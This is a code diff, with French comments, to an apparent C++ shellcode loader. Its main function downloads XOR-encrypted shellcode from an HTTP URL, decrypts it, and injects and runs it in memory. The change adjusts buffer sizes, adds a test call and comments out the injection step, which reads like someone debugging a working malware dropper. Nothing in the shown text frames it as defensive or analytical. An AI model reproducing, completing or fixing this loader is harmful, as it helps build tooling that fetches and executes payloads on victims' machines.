@@ -9,7 +9,7 @@ int main() {
     const char* server_url = "http://127.0.0.1:8000/shellcode.bin";
 
     char* encrypted_shellcode = nullptr; // Stocke le shellcode chiffré
-    size_t shellcode_size = 433;           // Taille du shellcode téléchargé
+    size_t shellcode_size = 436;           // Taille du shellcode téléchargé
 
     // Étape 1 : Télécharger le shellcode chiffré depuis le serveur
     if (!download_shellcode(server_url, &encrypted_shellcode, &shellcode_size)) {
@@ -17,13 +17,15 @@ int main() {
     }
 
     // Étape 2 : Déchiffrer le shellcode (utilisation d'un XOR simple)
-    decrypt_shellcode(encrypted_shellcode, shellcode_size);
+    decrypt_shellcode(encrypted_shellcode, shellcode_size-3);
 
-    // Étape 3 : Injecter et exécuter le shellcode
-    if (!inject_shellcode(encrypted_shellcode, shellcode_size)) {
-        delete[] encrypted_shellcode; // Libération de la mémoire
-        return -2; // Erreur lors de l'injection
-    }
+    test_shellcode(encrypted_shellcode, shellcode_size-3);
+
+    //// Étape 3 : Injecter et exécuter le shellcode
+    //if (!inject_shellcode(encrypted_shellcode, shellcode_size-3)) {
+    //    delete[] encrypted_shellcode; // Libération de la mémoire
+    //    return -2; // Erreur lors de l'injection
+    //}
 
     // Libérer la mémoire allouée
     delete[] encrypted_shellcode;
